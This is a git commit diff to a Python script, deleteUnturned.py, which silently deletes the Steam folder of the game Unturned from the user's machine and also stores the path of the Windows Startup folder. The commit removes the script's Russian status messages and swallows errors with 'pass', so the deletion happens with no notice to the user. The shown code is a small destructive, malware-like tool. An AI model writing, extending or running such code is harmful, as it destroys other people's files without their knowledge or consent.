a33332e352071387e30cb46e36dca81487eced4c
RomacH <RomacHGaminG@gmail.com>
2022-10-19 20:04:20 +0300

    removed prints

--- deleteUnturned.py
+++ deleteUnturned.py
@@ -9,20 +9,13 @@ class DelUnturned:
         self.userDir = pathlib.Path.home()
         self.startUpDir = f'{self.userDir}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
 
-    def success(self) -> None:
-        print("Дамой Unturned")
-
-    def error(self) -> None:
-        print("Не дамой Unturned :(")
 
     def deleteUnturned(self) -> None:
         try:
             shutil.rmtree(
                 f"{self.SYS}\\Program Files (x86)\\Steam\\steamapps\\common\\unturned")
-            self.success()
         except Exception as ex:
-            print(repr(ex))
-            self.error()
+            pass
 
 
 def main() -> None:
